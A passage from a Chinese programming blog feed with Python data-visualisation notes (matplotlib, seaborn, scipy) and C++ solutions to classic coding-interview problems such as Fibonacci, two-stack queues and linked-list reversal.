<h4 id="4-stem-散点图"><a href="#4-stem-散点图" class="headerlink" title="4) stem 散点图"></a>4) stem 散点图</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">y = np.linspace(<span class="number">0</span>, <span class="number">100</span>, <span class="number">32</span>)</span><br><span class="line">x = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line">plt.stem(x, y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>效果图</p>
<img src = "2018_11_29_02.png">

<h4 id="5-展示图片"><a href="#5-展示图片" class="headerlink" title="5) 展示图片"></a>5) 展示图片</h4><ul>
<li>需要用到PIL库</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;./screen.png&#x27;</span>)</span><br><span class="line">plt.figure()</span><br><span class="line">plt.imshow(img)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h4 id="6-hist-直方图"><a href="#6-hist-直方图" class="headerlink" title="6) hist 直方图"></a>6) hist 直方图</h4><ul>
<li><code>bins</code>: 分几组，越大直方图越细节</li>
<li><code>label</code>: 多标签的时候的图例，需要x传入数组，label和data的size一致</li>
<li>需要调用legend才能显示图例，否则不会显示图例</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.hist(x=[train_data[train_data[<span class="string">&#x27;label&#x27;</span>]==<span class="number">0</span>][<span class="string">&#x27;shan&#x27;</span>], train_data[train_data[<span class="string">&#x27;label&#x27;</span>]==<span class="number">1</span>][<span class="string">&#x27;shan&#x27;</span>]], bins=<span class="number">50</span>, label=[<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>])</span><br><span class="line">plt.legend([<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p><img src="/2023-09-23-02.png"></p>
<h4 id="7-绘制折线图"><a href="#7-绘制折线图" class="headerlink" title="7) 绘制折线图"></a>7) 绘制折线图</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.plot(time_series, zeros_data, label=<span class="string">&quot;0&quot;</span>)</span><br><span class="line">plt.plot(time_series, one_two_data, label=<span class="string">&quot;1~2&quot;</span>)</span><br><span class="line">plt.plot(time_series, upper_two_data, label=<span class="string">&quot;3~&quot;</span>)</span><br><span class="line">plt.xticks(time_series, rotation=<span class="number">45</span>, ha=<span class="string">&#x27;right&#x27;</span>) <span class="comment"># x轴斜着展示</span></span><br><span class="line">plt.legend(loc=<span class="string">&#x27;upper right&#x27;</span>) <span class="comment"># 图例右上角</span></span><br><span class="line">plt.title(<span class="string">&quot;随时间变化曲线&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2023-10-20-02.png"></p>
<h3 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h3><h4 id="1-字体设置"><a href="#1-字体设置" class="headerlink" title="1) 字体设置"></a>1) 字体设置</h4><ul>
<li>默认的字体可能会导致中文显示不正常，需要设置字体</li>
</ul>
<p><strong>打印当前支持设置的字体</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印当前支持设置的字体</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.font_manager <span class="keyword">as</span> fm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取可用字体族</span></span><br><span class="line">font_families = <span class="built_in">sorted</span>(<span class="built_in">set</span>([f.name <span class="keyword">for</span> f <span class="keyword">in</span> fm.fontManager.ttflist]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印所有可用字体族</span></span><br><span class="line"><span class="keyword">for</span> font_family <span class="keyword">in</span> font_families:</span><br><span class="line">    <span class="built_in">print</span>(font_family)</span><br></pre></td></tr></table></figure>

<p><strong>打印当前默认字体</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="built_in">print</span>(plt.rcParams[<span class="string">&quot;font.family&quot;</span>])</span><br><span class="line"><span class="built_in">print</span>(plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>])</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;sans-serif&#x27;]</span><br><span class="line">[&#x27;DejaVu Sans&#x27;, &#x27;Bitstream Vera Sans&#x27;, &#x27;Computer Modern Sans Serif&#x27;, &#x27;Lucida Grande&#x27;, &#x27;Verdana&#x27;, &#x27;Geneva&#x27;, &#x27;Lucid&#x27;, &#x27;Arial&#x27;, &#x27;Helvetica&#x27;, &#x27;Avant Garde&#x27;, &#x27;sans-serif&#x27;]</span><br></pre></td></tr></table></figure>

<p><strong>设置字体</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;WenQuanYi Micro Hei&#x27;</span>, <span class="string">&#x27;Consolas&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h2 id="4-seaborn"><a href="#4-seaborn" class="headerlink" title="4. seaborn"></a>4. seaborn</h2><h3 id="4-1-画图统计向量中值的出现次数-countplot"><a href="#4-1-画图统计向量中值的出现次数-countplot" class="headerlink" title="4.1. 画图统计向量中值的出现次数 countplot"></a>4.1. 画图统计向量中值的出现次数 countplot</h3><ul>
<li><code>x</code>: 要统计数量的标签</li>
<li><code>hue</code>: 不同颜色表示的不同的标签，分别进行统计</li>
</ul>
<h4 id="1-dataframe"><a href="#1-dataframe" class="headerlink" title="1) dataframe"></a>1) dataframe</h4><h5 id="1-针对单标签画图"><a href="#1-针对单标签画图" class="headerlink" title="(1) 针对单标签画图"></a>(1) 针对单标签画图</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">b = pd.DataFrame(a, columns=[<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">c = pd.DataFrame(a, columns=[<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">d = pd.concat([b, c], ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment"># 指定dataframe的某一列画次数图</span></span><br><span class="line">sns.countplot(d, x=<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   a</span><br><span class="line">0  1</span><br><span class="line">1  2</span><br><span class="line">2  3</span><br><span class="line">3  1</span><br><span class="line">4  2</span><br><span class="line">5  3</span><br></pre></td></tr></table></figure>

<p>效果图</p>
<img src = "2018_11_29_03.png">

<h5 id="2-对两个标签进行统计画图"><a href="#2-对两个标签进行统计画图" class="headerlink" title="(2) 对两个标签进行统计画图"></a>(2) 对两个标签进行统计画图</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sns.countplot(train_data, x=<span class="string">&#x27;length&#x27;</span>, hue=<span class="string">&#x27;label&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2023-09-23-01.png"></p>
<h4 id="2-list"><a href="#2-list" class="headerlink" title="2) list"></a>2) list</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    data.append(random.randint(<span class="number">0</span>, <span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">sns.countplot(x=data)</span><br></pre></td></tr></table></figure>

<p><img src="/2023-10-20-01.png"></p>
<h3 id="4-2-scatterplot-散点图"><a href="#4-2-scatterplot-散点图" class="headerlink" title="4.2. scatterplot 散点图"></a>4.2. scatterplot 散点图</h3><h4 id="1-根据不同的label画不同颜色的散点图"><a href="#1-根据不同的label画不同颜色的散点图" class="headerlink" title="1) 根据不同的label画不同颜色的散点图"></a>1) 根据不同的label画不同颜色的散点图</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成颜色调色板</span></span><br><span class="line">palette = sns.color_palette(<span class="string">&quot;bright&quot;</span>, <span class="number">10</span>)</span><br><span class="line"><span class="comment"># x就是x，y就是y，区分不同的点就是label区分，调色板使用生成的亮色</span></span><br><span class="line">sns.scatterplot(x=<span class="string">&#x27;x&#x27;</span>, y=<span class="string">&#x27;y&#x27;</span>, data=tsne_df, hue=<span class="string">&#x27;label&#x27;</span>, palette=palette)</span><br></pre></td></tr></table></figure>

<p><img src="/2023-09-17-01.png"></p>
<h2 id="5-scipy"><a href="#5-scipy" class="headerlink" title="5. scipy"></a>5. scipy</h2><h3 id="5-1-fftpack"><a href="#5-1-fftpack" class="headerlink" title="5.1. fftpack"></a>5.1. fftpack</h3><h4 id="1-fft-快速傅里叶变换"><a href="#1-fft-快速傅里叶变换" class="headerlink" title="1) fft 快速傅里叶变换"></a>1) fft 快速傅里叶变换</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.fftpack <span class="keyword">import</span> fft</span><br><span class="line"></span><br><span class="line">x = np.linespace(<span class="number">0</span>, <span class="number">100</span>, <span class="number">32</span>)</span><br><span class="line">y = fft(x) <span class="comment"># 得到x的32点fft</span></span><br></pre></td></tr></table></figure>

<h2 id="6-pytorch"><a href="#6-pytorch" class="headerlink" title="6. pytorch"></a>6. pytorch</h2><h3 id="6-1-安装"><a href="#6-1-安装" class="headerlink" title="6.1. 安装"></a>6.1. 安装</h3><ul>
<li>需要访问<a href="https://pytorch.org/get-started/locally/">官网</a>生成下载链接再下载安装</li>
</ul>
<h2 id="7-sklearn"><a href="#7-sklearn" class="headerlink" title="7. sklearn"></a>7. sklearn</h2><h3 id="7-1-安装"><a href="#7-1-安装" class="headerlink" title="7.1. 安装"></a>7.1. 安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install scikit-learn</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>编程题思路记录</title>
    <url>/blogs/2019-10-21-programQuestion/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>leetcode刷题记录在 <a href="/bookPages/docs/leetcode/">LeetCode刷题思路总结</a></p>
<h1 id="1-二维数组查找"><a href="#1-二维数组查找" class="headerlink" title="1. 二维数组查找"></a>1. 二维数组查找</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>从右侧最上方开始，查到小于后，竖着找大于的，然后横着，直到数组溢出或者找到为止</p>
<h1 id="2-斐波那切数列输出"><a href="#2-斐波那切数列输出" class="headerlink" title="2. 斐波那切数列输出"></a><span id = "H2">2. 斐波那切数列输出</span></h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>大家都知道斐波那契数列，现在要求输入一个整数n，请你输出斐波那契数列的第n项（从0开始，第0项为0）。<br>n&lt;&#x3D;39</p>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><h3 id="硬解"><a href="#硬解" class="headerlink" title="硬解"></a>硬解</h3><p>保存前一次和前前一次，一步一步算</p>
<h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><ul>
<li>每次计算中直接调用自己的<code>n - 1</code>和<code>n - 2</code>的值</li>
<li>防止递归过大，预留一个40的int数组，如果数组相应索引有值直接返回，没值递归算出保存返回</li>
</ul>
<h3 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h3><ul>
<li>两个变量，g保存当前和前一次，f保存前一次和前两次</li>
<li>计算方法</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Fibonacci</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> f = <span class="number">0</span>, g = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(n--) &#123;</span><br><span class="line">            g += f;     <span class="comment">//从前一次到当前</span></span><br><span class="line">            f = g - f;  <span class="comment">//从前两次算到前一次</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="3-青蛙跳台阶"><a href="#3-青蛙跳台阶" class="headerlink" title="3. 青蛙跳台阶"></a><span id = "H4">3. 青蛙跳台阶</span></h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法（先后次序不同算不同的结果）。</p>
<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>青蛙跳n阶台阶，从第一跳来算:</p>
<ul>
<li>第一次跳1阶，剩下种类为$f(n - 1)$</li>
<li>第一次跳2阶，剩下种类为$f(n - 2)$</li>
</ul>
<p>则</p>
<p>$$f(n) &#x3D; f(n - 1) + f(n - 2)$$</p>
<p>其中</p>
<p>$$f(0) &#x3D; 0, f(1) &#x3D; 1，f(2) &#x3D; 2$$</p>
<p>分析可以看出和<a href="#H2">斐波那切数列输出</a>除了初始值基本一致</p>
<h1 id="4-两个栈实现队列"><a href="#4-两个栈实现队列" class="headerlink" title="4. 两个栈实现队列"></a>4. 两个栈实现队列</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>用两个栈来实现一个队列，完成队列的Push和Pop操作。 队列中的元素为int类型。</p>
<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><ul>
<li>stack1为入队列栈，stack2为出队列栈</li>
<li>stack2不为空时直接出栈，为空则从stack1取所有元素</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> node)</span> </span>&#123;</span><br><span class="line">        stack1.<span class="built_in">push</span>(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//为空才从stack1拿数据</span></span><br><span class="line">        <span class="keyword">if</span> (stack2.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="comment">//stack1也是空的，就返回-1</span></span><br><span class="line">            <span class="keyword">if</span> (stack1.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (!stack1.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                stack2.<span class="built_in">push</span>(stack1.<span class="built_in">top</span>());</span><br><span class="line">                stack1.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> result = stack2.<span class="built_in">top</span>();</span><br><span class="line">        stack2.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; stack1;  <span class="comment">//入队列</span></span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; stack2;  <span class="comment">//出队列</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="旋转数组查找最小值"><a href="#旋转数组查找最小值" class="headerlink" title="旋转数组查找最小值"></a>旋转数组查找最小值</h1><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><p>把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。<br>输入一个非递减排序的数组的一个旋转，输出旋转数组的最小元素。<br>例如数组{3,4,5,1,2}为{1,2,3,4,5}的一个旋转，该数组的最小值为1。<br>NOTE：给出的所有元素都大于0，若数组大小为0，请返回0。</p>
<h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><ul>
<li>数组旋转后，最小值为分界点的值，利用二分查找方式最快到达最小值输出。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minNumberInRotateArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt; rotateArray)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (rotateArray.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> right = rotateArray.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//另类的二分查找，比左边的大，左边等，比右边的小，右边等</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> tmp = (left + right) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tmp == left) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rotateArray[tmp] &gt;= rotateArray[left]) &#123;</span><br><span class="line">                left = tmp;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                right = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (rotateArray[left] &lt; rotateArray[right]) &#123;</span><br><span class="line">            <span class="keyword">return</span> rotateArray[left];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> rotateArray[right];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="变态跳台阶的问题"><a href="#变态跳台阶的问题" class="headerlink" title="变态跳台阶的问题"></a>变态跳台阶的问题</h1><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级……它也可以跳上n级。求该青蛙跳上一个n级的台阶总共有多少种跳法。</p>
<h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><ul>
<li>数学统计题，$f(n) &#x3D; f(n - 1) + f(n - 2) + … + f(1) + 1 &#x3D; 2^{n - 1}$</li>
<li>使用<code>1 &lt;&lt; (number - 1)</code>计算2的<code>n - 1</code>次幂更快</li>
</ul>
<h1 id="重建二叉树"><a href="#重建二叉树" class="headerlink" title="重建二叉树"></a>重建二叉树</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1,2,4,7,3,5,6,8}和中序遍历序列{4,7,2,1,5,3,8,6}，则重建二叉树并返回。</p>
<h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><ul>
<li>中序遍历的头结点左边为左子树，右边为右子树</li>
<li>前序遍历第一个为头结点</li>
<li>两个结合，找到头结点在中序遍历中的位置，左边递归出来为左子树，右边递归出来为右子树</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> TreeNode* <span class="title">reConstructBinaryTree</span><span class="params">(vector&lt;<span class="type">int</span>&gt; pre,vector&lt;<span class="type">int</span>&gt; vin)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pre.<span class="built_in">size</span>() != vin.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reConstructBinaryTree</span>(pre.<span class="built_in">begin</span>().<span class="built_in">base</span>(), vin.<span class="built_in">begin</span>().<span class="built_in">base</span>(), pre.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> TreeNode* <span class="title">reConstructBinaryTree</span><span class="params">(<span class="type">const</span> <span class="type">int</span> *pre, <span class="type">const</span> <span class="type">int</span> *vin, <span class="type">int</span> size)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//头结点从pre第一个取</span></span><br><span class="line">        <span class="keyword">auto</span> head = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(pre[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">//找到和vin中和pre[0]相等的点，左边为左子树，右边为右子树</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (vin[i] == pre[<span class="number">0</span>]) &#123;</span><br><span class="line">                head-&gt;left = <span class="built_in">reConstructBinaryTree</span>(pre + <span class="number">1</span>, vin, i);</span><br><span class="line">                head-&gt;right = <span class="built_in">reConstructBinaryTree</span>(pre + i + <span class="number">1</span>, vin + i + <span class="number">1</span>, size - i - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="链表倒数第k个值"><a href="#链表倒数第k个值" class="headerlink" title="链表倒数第k个值"></a>链表倒数第k个值</h1><h2 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h2><p>输入一个链表，输出该链表中倒数第k个结点。</p>
<h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><ul>
<li>两个指针，一个比另一个先走k步，直到遍历完整个链表返回第二个指针</li>
</ul>
<h1 id="链表翻转"><a href="#链表翻转" class="headerlink" title="链表翻转"></a>链表翻转</h1><h2 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h2><p>输入一个链表，反转链表后，输出新链表的表头。</p>
<h2 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h2><ul>
<li>三个指针，一个遍历，一个翻转next，一个保存前一个节点</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> ListNode* <span class="title">ReverseList</span><span class="params">(ListNode* pHead)</span> </span>&#123;</span><br><span class="line">        ListNode *p1 = <span class="literal">nullptr</span>;     <span class="comment">//跟在后面翻转next的指针</span></span><br><span class="line">        ListNode *p2 = <span class="literal">nullptr</span>;     <span class="comment">//保存前一次</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (pHead != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            p2 = p1;</span><br><span class="line">            p1 = pHead;</span><br><span class="line">            pHead = pHead-&gt;next;</span><br><span class="line">            p1-&gt;next = p2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> p1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="矩形覆盖"><a href="#矩形覆盖" class="headerlink" title="矩形覆盖"></a>矩形覆盖</h1><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p>我们可以用$2 \times 1$的小矩形横着或者竖着去覆盖更大的矩形。请问用n个$2 \times 1$的小矩形无重叠地覆盖一个$2 \times n$的大矩形，总共有多少种方法？</p>
<h2 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h2><ul>
<li>分析一下，相当于<a href="#H4">青蛙跳台阶</a>，竖着放就是跳一阶，横着放就是跳两阶</li>
</ul>
<h1 id="调整数组中奇数位于偶数前面"><a href="#调整数组中奇数位于偶数前面" class="headerlink" title="调整数组中奇数位于偶数前面"></a>调整数组中奇数位于偶数前面</h1><h2 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h2><p>输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分，并保证奇数和奇数，偶数和偶数之间的相对位置不变。</p>
<h2 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h2><h3 id="硬解-1"><a href="#硬解-1" class="headerlink" title="硬解"></a>硬解</h3><ul>
<li>查找到第一个偶数和后面第一个奇数</li>
<li>将中间的偶数后移一位，奇数前移到偶数的位置</li>
<li>编译直到完成</li>
</ul>
<h3 id="另加队列"><a href="#另加队列" class="headerlink" title="另加队列"></a>另加队列</h3><ul>
<li>遍历，偶数放入新队列，奇数前移</li>
<li>遍历完后拷贝新队列到老队列最后一个奇数后面</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">reOrderArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;array)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; Odd;     <span class="comment">//偶数队列</span></span><br><span class="line">        <span class="type">int</span> size = array.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> j = <span class="number">0</span>;              <span class="comment">//保存最后待放偶数的位置</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((array[i] % <span class="number">2</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//偶数加到新队列</span></span><br><span class="line">                Odd.<span class="built_in">emplace_back</span>(array[i]);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i != j) &#123;</span><br><span class="line">                <span class="comment">//奇数前移</span></span><br><span class="line">                array[j] = array[i];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++j;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(array.<span class="built_in">begin</span>().<span class="built_in">base</span>() + j, Odd.<span class="built_in">begin</span>().<span class="built_in">base</span>(), Odd.<span class="built_in">size</span>() * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="标准库-stable-partition"><a href="#标准库-stable-partition" class="headerlink" title="标准库 stable_partition"></a>标准库 stable_partition</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">reOrderArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;array)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 奇数放前面，偶数放后面，两边分别的相对位置保持不变</span></span><br><span class="line">        <span class="built_in">stable_partition</span>(array.<span class="built_in">begin</span>(), array.<span class="built_in">end</span>(),</span><br><span class="line">                            [](<span class="type">const</span> <span class="type">int</span> &amp;value) &#123; <span class="built_in">return</span> 